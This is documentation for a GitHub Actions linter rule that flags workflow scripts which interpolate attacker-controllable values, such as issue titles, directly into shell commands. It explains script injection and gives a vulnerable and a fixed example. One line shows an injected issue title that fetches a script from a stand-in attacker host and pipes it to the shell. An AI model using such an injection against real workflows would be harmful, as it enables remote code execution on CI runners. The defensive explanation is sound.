# untrusted-input

| Kind | Category | Default severity |
|---|---|---|
| `expression` | correctness | error |

A script reads a value that someone outside the repository can set.

The rule checks `run:` scripts and the `script` input of `actions/github-script`. The untrusted values include the titles and bodies of issues, pull requests, and comments, commit messages and authors, and the head branch of a pull request. For a `workflow_run` event they include the head branch, the display title, and the message, author, and committer of the head commit of the run that triggered it, because a pull request from a fork can start that run. A value that a function only tests, such as the result of `contains()`, cannot inject code and is not reported.

## Why

GitHub replaces `${{ }}` in a script with the value before the shell runs it. An issue titled `'; curl attacker.example | sh; '` turns `echo '${{ github.event.issue.title }}'` into a command that the attacker chose. An environment variable passes the value as data.

## Failing example

```yaml
on: issues
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo '${{ github.event.issue.title }}'
```

```text
test.yaml:6:24: "github.event.issue.title" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [untrusted-input]
```

## Passing example

```yaml
on: issues
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "$TITLE"
        env:
          TITLE: ${{ github.event.issue.title }}
      - run: echo '${{ contains(github.event.issue.title, 'bug') }}'
```

## Differences from actionlint

- [Case-insensitive literal index keys](../differences.md#literal-index-case)
- [Every `${{ }}` in a string is checked](../differences.md#all-expressions-in-string)
- [Untrusted input from `workflow_run`](../differences.md#workflow-run-untrusted-input)
